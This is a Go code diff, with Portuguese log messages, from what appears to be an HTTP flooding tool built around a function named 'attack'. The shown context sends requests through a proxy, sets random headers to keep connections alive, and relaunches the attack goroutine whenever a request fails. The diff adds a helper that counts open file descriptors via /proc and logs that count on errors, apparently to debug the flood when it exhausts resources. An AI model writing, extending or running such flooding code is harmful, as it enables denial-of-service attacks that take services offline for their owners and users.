@@ -62,6 +62,13 @@ func generateRandomString(n int) string {
     }
     return string(b)
 }
+
+func countOpenFiles() int {
+    pid := os.Getpid()
+    files, _ := filepath.Glob(fmt.Sprintf("/proc/%d/fd/*", pid))
+    return len(files)
+}
+
 func parseDuration(durationStr string) time.Duration {
     d, err := time.ParseDuration(durationStr)
     if err != nil {
@@ -113,7 +120,7 @@ func attack(ctx context.Context, proxyURL string, dialTimeout, tlsTimeout, clien
             // Envia a requisição
             resp, err := client.Do(req)
             if err != nil {
-                fmt.Println("Erro ao enviar a requisição:", err)
+                fmt.Printf("Erro ao enviar a requisição (total de arquivos abertos: %d): %v\n", countOpenFiles(), err)
                 go attack(ctx, proxyURL, dialTimeout, tlsTimeout, clientTimeout, stopChan)
                 return
             }
@@ -132,7 +139,7 @@ func attack(ctx context.Context, proxyURL string, dialTimeout, tlsTimeout, clien
                         req.Header.Set("X-Random", generateRandomString(10))
                         _, err := client.Do(req)
                         if err != nil {
-                            fmt.Println("Erro ao manter a conexão:", err)
+                            fmt.Printf("Erro ao manter a conexão (total de arquivos abertos: %d): %v\n", countOpenFiles(), err)
                             go attack(ctx, proxyURL, dialTimeout, tlsTimeout, clientTimeout, stopChan)
                             return
                         }
